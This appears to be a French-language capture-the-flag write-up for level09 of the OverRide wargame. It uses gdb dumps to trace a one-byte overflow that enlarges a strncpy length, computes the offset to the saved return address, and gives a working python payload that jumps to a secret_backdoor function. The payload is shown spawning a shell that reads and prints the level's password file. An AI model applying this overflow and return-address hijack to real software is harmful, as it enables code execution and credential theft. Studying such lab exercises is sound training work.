@@ -1,0 +1,477 @@
+********************************
+**** 1 - Testons le binaire ****
+********************************
+
+level09@OverRide:~$ ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: smakni
+>: Welcome, smakni
+>: Msg @Unix-Dude
+>>: hello
+>: Msg sent!
+
+level09@OverRide:~$ ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+-> On note deja un comportement anormal quand on set un long 'username', on a pas saisie de message mais l'execution a continuer comme si et l'a envoyé puis terminer
+
+********************************
+
+*******************************************
+**** 2 - Examinons la mémoire dans gdb **** 
+*******************************************
+
+(gdb)r
+...
+
+(gdb) c
+Continuing.
+>: Enter your username
+>>: AAAA
+>: Welcome, AAAA
+
+Breakpoint 6, 0x000055555555491f in handle_msg ()				- On break après le set_username pour regarder l'état de la mémoire, l'argument de set_username est rbp-0xc0 donc on va aller regarder à cette adresse
+(gdb) disas handle_msg
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   rbp
+   0x00005555555548c1 <+1>:	mov    rbp,rsp
+   0x00005555555548c4 <+4>:	sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+   0x000055555555490d <+77>:	mov    rdi,rax
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+=> 0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leave
+   0x0000555555554931 <+113>:	ret
+End of assembler dump.
+
+(gdb) x/100wx $rbp-0xc0
+0x7fffffffe4d0:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe4e0:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe4f0:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe500:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe510:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe520:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe530:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe540:	0xffffe680	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe550:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141  -> 0x41414141 - On retrouve notre username ici*
+0x7fffffffe560:	0x0000000a	0x00000000	0x00000000	0x00000000
+0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe580:	0x00000000	0x0000008c	0xffffe5a0	0x00007fff
+0x7fffffffe590:	0xffffe5a0	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe5a0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe5b0:	0x00000000	0x00000000	0xffffe688	0x00007fff
+0x7fffffffe5c0:	0x55554000	0x00000001	0x55554aa8	0x00005555
+0x7fffffffe5d0:	0x00000000	0x00000000	0x8f5496d5	0x36f0090a
+0x7fffffffe5e0:	0x55554790	0x00005555	0xffffe680	0x00007fff
+0x7fffffffe5f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe600:	0x443496d5	0xc90ff6f5	0x200496d5	0xc90fe64d
+0x7fffffffe610:	0x00000000	0x00007fff	0x00000000	0x00000000
+0x7fffffffe620:	0x00000000	0x00000000	0x55554ad0	0x00005555
+0x7fffffffe630:	0xffffe688	0x00007fff	0x00000001	0x00000000
+0x7fffffffe640:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe650:	0x55554790	0x00005555	0xffffe680	0x00007fff
+
+*(gdb) find 0x7fffffffe4d0, 0x7fffffffe650, 0x41414141 ("AAAA")
+0x7fffffffe55c
+(gdb) x/s 0x7fffffffe55c
+0x7fffffffe55c:	 "AAAA\n"
+-> on a l'adresse exate de notre username
+
+(gdb) p/x 0x7fffffffe55c - 140
+$30 = 0x7fffffffe4d0 
+-> on retombre bien sur l'adresse envoie en argument a set_username cf source.c
+
+(gdb) c
+Continuing.
+>: Msg @Unix-Dude
+>>: BBBB
+
+Breakpoint 7, 0x000055555555492b in handle_msg ()				 - On continue et même chose on break après le set_msg pour regarder l'état de la mémoire, l'argument de set_username est rbp-0xc0 donc on va aller regarder à cette adresse
+
+(gdb) x/100wx $rbp-0xc0
+0x7fffffffe4d0:	0x42424242	0x0000000a	0x00000000	0x00000000   -> 0x42424242 - On retrouve notre message ici
+0x7fffffffe4e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe4f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x41414141
+0x7fffffffe560:	0x0000000a	0x00000000	0x00000000	0x00000000
+0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe580:	0x00000000	0x0000008c	<- 0xffffe5a0	0x00007fff
+0x7fffffffe590:	0xffffe5a0	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe5a0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe5b0:	0x00000000	0x00000000	0xffffe688	0x00007fff
+0x7fffffffe5c0:	0x55554000	0x00000001	0x55554aa8	0x00005555
+0x7fffffffe5d0:	0x00000000	0x00000000	0x8f5496d5	0x36f0090a
+0x7fffffffe5e0:	0x55554790	0x00005555	0xffffe680	0x00007fff
+0x7fffffffe5f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe600:	0x443496d5	0xc90ff6f5	0x200496d5	0xc90fe64d
+0x7fffffffe610:	0x00000000	0x00007fff	0x00000000	0x00000000
+0x7fffffffe620:	0x00000000	0x00000000	0x55554ad0	0x00005555
+0x7fffffffe630:	0xffffe688	0x00007fff	0x00000001	0x00000000
+0x7fffffffe640:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe650:	0x55554790	0x00005555	0xffffe680	0x00007fff
+
+En revenant ici après les tests en dessous on peut voir
+(gdb) find 0x7fffffffe4d0, 0x7fffffffe650, 0x8c
+0x7fffffffe584
+1 pattern found.
+(gdb) p/d 0x7fffffffe584 - 0x7fffffffe55c (adresse de username - adresse de 0x8c = 40 donc si on e2crit un username de 40 charactère on écrit change le 0x8c)
+$31 = 40
+
+************************************
+**** Test avec un long username ****
+************************************
+
+(gdb) c
+Continuing.
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 2, 0x0000555555554915 in handle_msg ()
+(gdb) x/100x rbp-0xc0
+No symbol table is loaded.  Use the "file" command.
+(gdb) x/100x $rbp-0xc0
+0x7fffffffe4d0:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe4e0:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe4f0:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe500:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe510:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe520:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe530:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe540:	0xffffe680	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe550:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141		-> On retoruvre notre username mais...
+0x7fffffffe560:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe570:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe580:	0x41414141	0x00000041 <-	0xffffe5a0	0x00007fff		* on voit que ce byte à également été écrit depuis notre inout (0x41 = 65 = 'A') et avant c'était 0x8c = 140 -> qio est la taille de notre buffer initial cf source (char local_c8[140];)
+0x7fffffffe590:	0xffffe5a0	0x00007fff	0x55554abd	0x00005555				0x00005555555548c4 <handle_msg +4>:	sub    rsp,0xc0
+0x7fffffffe5a0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff						0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+0x7fffffffe5b0:	0x00000000	0x00000000	0xffffe688	0x00007fff
+0x7fffffffe5c0:	0x55554000	0x00000001	0x55554aa8	0x00005555
+0x7fffffffe5d0:	0x00000000	0x00000000	0x922ebe2e	0xa35feecd
+0x7fffffffe5e0:	0x55554790	0x00005555	0xffffe680	0x00007fff
+0x7fffffffe5f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe600:	0x594ebe2e	0x5ca01132	0x3d7ebe2e	0x5ca0018a
+0x7fffffffe610:	0x00000000	0x00007fff	0x00000000	0x00000000
+0x7fffffffe620:	0x00000000	0x00000000	0x55554ad0	0x00005555
+0x7fffffffe630:	0xffffe688	0x00007fff	0x00000001	0x00000000
+0x7fffffffe640:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe650:	0x55554790	0x00005555	0xffffe680	0x00007fff
+(gdb)
+
+On voit qu'il y a 41 'A' et que le 0x8c et devenu 0x41
+
+*cf source.c, le for qui écrit notre user name a une limite de si il trouve un '\0' ou 41 donc si on ecrit 41 caractères on va overwrite le param size du strncpy de set_msg
+
+**** Test sur l'initialisation de handle_msg *****
+(gdb) c
+Continuing.
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+
+Breakpoint 4, 0x00005555555548d2 in handle_msg ()
+(gdb) disas handle_msg
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   rbp
+   0x00005555555548c1 <+1>:	mov    rbp,rsp
+   0x00005555555548c4 <+4>:	sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+=> 0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+   0x000055555555490d <+77>:	mov    rdi,rax
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leave
+   0x0000555555554931 <+113>:	ret
+End of assembler dump.
+(gdb) i r
+rax            0x7fffffffe4d0	140737488348368			-> on voit que rax = rsp = rbp - 0x8c
+rbx            0x0	0
+rcx            0x7ffff7b01f90	140737348902800
+rdx            0x7ffff7dd5a90	140737351867024
+rsi            0x7ffff7ff7000	140737354100736
+rdi            0xffffffff	4294967295
+rbp            0x7fffffffe590	0x7fffffffe590
+rsp            0x7fffffffe4d0	0x7fffffffe4d0
+r8             0xffffffff	4294967295
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe680	140737488348800
+r14            0x0	0
+r15            0x0	0
+rip            0x5555555548d2	0x5555555548d2 <handle_msg+18>
+eflags         0x202	[ IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+(gdb) u
+0x00005555555548d8 in handle_msg ()
+
+(gdb) i r
+rax            0x7fffffffe55c	140737488348508			-> rax a été incrementer de 0x8c = 140
+rbx            0x0	0
+rcx            0x7ffff7b01f90	140737348902800
+rdx            0x7ffff7dd5a90	140737351867024
+rsi            0x7ffff7ff7000	140737354100736
+rdi            0xffffffff	4294967295
+rbp            0x7fffffffe590	0x7fffffffe590
+rsp            0x7fffffffe4d0	0x7fffffffe4d0
+r8             0xffffffff	4294967295
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe680	140737488348800
+r14            0x0	0
+r15            0x0	0
+rip            0x5555555548d8	0x5555555548d8 <handle_msg+24>
+eflags         0x206	[ PF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+-> on voit que ce 0x8c va être stocker à un endroit precis de la stack rbp-0xc [ 0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c ]
+
+(gdb) disas handle_msg
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   rbp
+   0x00005555555548c1 <+1>:	mov    rbp,rsp
+   0x00005555555548c4 <+4>:	sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0				*
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0			*
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0			* sa ressemble à une structure
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0			*
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0			*
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c			*	rbp - 0xc = rbp - 12 = 0x8c = 140
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+=> 0x000055555555490d <+77>:	mov    rdi,rax
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leave
+   0x0000555555554931 <+113>:	ret
+End of assembler dump.
+0x000055555555490d in handle_msg ()
+(gdb) i r
+rax            0x7fffffffe4d0	140737488348368 -> On remet rbp-0xc0 dans rax qui va être utilisé comme argument des fonctions qui suivent avec rdi en premier, set_username
+rbx            0x0	0
+rcx            0x7ffff7b01f90	140737348902800
+rdx            0x7ffff7dd5a90	140737351867024
+rsi            0x7ffff7ff7000	140737354100736
+rdi            0xffffffff	4294967295
+rbp            0x7fffffffe590	0x7fffffffe590
+rsp            0x7fffffffe4d0	0x7fffffffe4d0
+r8             0xffffffff	4294967295
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe680	140737488348800
+r14            0x0	0
+r15            0x0	0
+rip            0x55555555490d	0x55555555490d <handle_msg+77>
+eflags         0x206	[ PF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+
+Maintenant dans set_msg on voit que sncp prends en argument de longueur le fameux 0xc8 (140)
+(gdb) disas set_msg
+Dump of assembler code for function set_msg:
+   0x0000555555554932 <+0>:	push   rbp
+   0x0000555555554933 <+1>:	mov    rbp,rsp
+   0x0000555555554936 <+4>:	sub    rsp,0x410
+   0x000055555555493d <+11>:	mov    QWORD PTR [rbp-0x408],rdi
+   0x0000555555554944 <+18>:	lea    rax,[rbp-0x400]
+   0x000055555555494b <+25>:	mov    rsi,rax
+   0x000055555555494e <+28>:	mov    eax,0x0
+   0x0000555555554953 <+33>:	mov    edx,0x80
+   0x0000555555554958 <+38>:	mov    rdi,rsi
+   0x000055555555495b <+41>:	mov    rcx,rdx
+   0x000055555555495e <+44>:	rep stos QWORD PTR es:[rdi],rax
+   0x0000555555554961 <+47>:	lea    rdi,[rip+0x265]        # 0x555555554bcd
+   0x0000555555554968 <+54>:	call   0x555555554730 <puts@plt>
+   0x000055555555496d <+59>:	lea    rax,[rip+0x26b]        # 0x555555554bdf
+   0x0000555555554974 <+66>:	mov    rdi,rax
+   0x0000555555554977 <+69>:	mov    eax,0x0
+   0x000055555555497c <+74>:	call   0x555555554750 <printf@plt>
+   0x0000555555554981 <+79>:	mov    rax,QWORD PTR [rip+0x201630]        # 0x555555755fb8
+   0x0000555555554988 <+86>:	mov    rax,QWORD PTR [rax]
+   0x000055555555498b <+89>:	mov    rdx,rax
+   0x000055555555498e <+92>:	lea    rax,[rbp-0x400]
+   0x0000555555554995 <+99>:	mov    esi,0x400
+   0x000055555555499a <+104>:	mov    rdi,rax
+   0x000055555555499d <+107>:	call   0x555555554770 <fgets@plt>
+   0x00005555555549a2 <+112>:	mov    rax,QWORD PTR [rbp-0x408]
+   0x00005555555549a9 <+119>:	mov    eax,DWORD PTR [rax+0xb4]
+
+   0x00005555555549af <+125>:	movsxd rdx,eax
+   0x00005555555549b2 <+128>:	lea    rcx,[rbp-0x400]
+   0x00005555555549b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]
+   0x00005555555549c0 <+142>:	mov    rsi,rcx
+   0x00005555555549c3 <+145>:	mov    rdi,rax
+=> 0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt>
+   
+   0x00005555555549cb <+153>:	leave
+   0x00005555555549cc <+154>:	ret
+End of assembler dump.
+(gdb) i r
+rax            0x7fffffffe4d0	140737488348368
+rbx            0x0	0
+rcx            0x7fffffffe0c0	140737488347328
+rdx            0x8c	140								<-
+rsi            0x7fffffffe0c0	140737488347328
+rdi            0x7fffffffe4d0	140737488348368
+rbp            0x7fffffffe4c0	0x7fffffffe4c0
+rsp            0x7fffffffe0b0	0x7fffffffe0b0
+r8             0x7ffff7ff0700	140737354073856
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe680	140737488348800
+r14            0x0	0
+r15            0x0	0
+rip            0x5555555549c6	0x5555555549c6 <set_msg+148>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+Donc cf le source.c pour mieux comprendre, on modifier le comporetent de strncpy et copier plus de bytes pour peut etre overwitre une eip (rip dans ce lvl) et y placer l'adresse de notre secret_backdoor()
+(gdb) p secret_backdoor
+$33 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+**** Trouvons l'offset entre le buffer et rip ****
+
+(gdb) disas handle_msg
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   rbp
+   0x00005555555548c1 <+1>:	mov    rbp,rsp
+   0x00005555555548c4 <+4>:	sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+   0x000055555555490d <+77>:	mov    rdi,rax
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+=> 0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leave
+   0x0000555555554931 <+113>:	ret
+End of assembler dump.
+
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffe5a0:
+ rip = 0x555555554924 in handle_msg; saved rip 0x555555554abd
+ called by frame at 0x7fffffffe5b0
+ Arglist at 0x7fffffffe590, args:
+ Locals at 0x7fffffffe590, Previous frame's sp is 0x7fffffffe5a0
+ Saved registers:
+  rbp at 0x7fffffffe590, rip at 0x7fffffffe598
+
+(gdb) p 0x7fffffffe598 - 0x7fffffffe4d0 (adresse de rip - adresse buffer)
+$35 = 200
+
+offset = 200 + 8 (car on est en 64bit) = 0xd0
+
+Donc si avec le premier for de set_username qui ecrit jusqu'à 41 caractères on overwrite le param size du strncpy du set_msg à 200 on va écrire sur rip, pour donc y placer l'adresse de secret_backdoor
+
+**** EXPLOIT ****
+
+(gdb) p secret_backdoor
+$33 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+1 - le username: 				'A' * 40 + offset + '\n' = 'A' * 40 + '\xd0' + '\n'
+2 - le msg:						'B' * 200
+3 - adresse secret_backdoor:	0x55555555488c = '\x8c\x48\x55\x55\x55\x55\x00\x00'
+
+Ce qui nous donne: python -c "print 'A' * 40 + '\xd0' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"
+
+level09@OverRide:~$  (python -c "print 'A' * 40 + '\xd0' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'";cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+Segmentation fault (core dumped)
+level09@OverRide:~$ (python -c "print 'A' * 40 + '\xd0' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'";cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
